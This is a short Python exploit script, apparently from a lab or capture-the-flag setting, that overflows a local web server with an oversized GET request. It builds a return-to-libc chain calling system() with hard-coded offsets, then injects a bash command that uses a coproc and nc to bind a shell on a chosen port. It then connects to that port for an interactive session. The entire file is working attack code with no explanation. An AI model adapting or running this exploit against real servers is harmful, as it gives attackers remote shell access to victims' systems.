#!/usr/bin/env python
from struct import pack
import sys
import socket
import subprocess
import time
from console import console

if len(sys.argv) != 3:
    sys.exit("Usage: %s PORT LISTEN_PORT" % sys.argv[0])

port = int(sys.argv[1])
sock = socket.create_connection(('127.0.0.1', port),
                                socket.getdefaulttimeout(),
                                ('127.0.0.1', 0))

base = int(subprocess.check_output(r"setarch i686 -R bash -c 'LD_TRACE_LOADED_OBJECTS=1 webroot/server'|sed -ne '/libc/ s/.*(\(.*\))/\1/p'", shell=True), 16)
p = ''
p += pack('<I', base + 0x00041080) #system
#p += pack('<I', 0xf7e4c7b0)
p += pack('<I', base + 0x000337b0) #exit
p += pack('<I', 0xffffceff) #cmd
p += pack('<I', 0xffffc850)
p += pack('<I', 0xffffc850)
p += ' '*500
p += "bash -c 'coproc p { /bin/bash 2>&1; }; nc -l 127.0.0.1 "+sys.argv[2]+" <&${p[0]} >&${p[1]}';   "

sock.sendall("GET /"+" "+'w'*119+p+"\r\n\r\n")

time.sleep(5)

port = int(sys.argv[2])
sock = socket.create_connection(('127.0.0.1', port),
                                socket.getdefaulttimeout(),
                                ('127.0.0.1', 0))

console(sock)
